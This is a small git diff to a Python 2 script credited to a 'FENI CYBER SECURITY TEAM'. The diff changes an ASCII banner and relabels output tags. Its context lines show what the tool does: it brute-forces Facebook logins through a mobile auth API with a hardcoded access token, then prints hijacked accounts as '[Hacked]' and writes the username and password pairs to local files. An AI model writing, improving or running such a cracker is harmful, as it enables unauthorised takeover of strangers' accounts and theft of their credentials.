@@ -70,8 +70,9 @@ logo='''
    dMP     dMP"VMP dMP" VP   dMP    
   dMMMP   dMP      VMMMb    dMP     
  dMP     dMP.aMP dP .dMP   dMP      
-dMP      VMMMP"  VMMMP"   dMP       
-🔰♻️ FENI CYBER SECURITY TEAM🔰♻️
+dMP      VMMMP"  VMMMP"   dMP   
+--------------------------------------------------    
+|  >>>>>>🔰♻️ FENI CYBER SECURITY TEAM🔰♻️<<<<<  |
 --------------------------------------------------
 ➣ Author     : Demon
 ➣ GitHub     : https://GitHub.com/abdullahalemon2
@@ -311,14 +312,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[Hacked]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
+				print '\x1b[1;92m[FCST Hacked]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '[CP] ' + k + c + user + ' | ' + pass1+'\n'
+					print '[FCST CP] ' + k + c + user + ' | ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
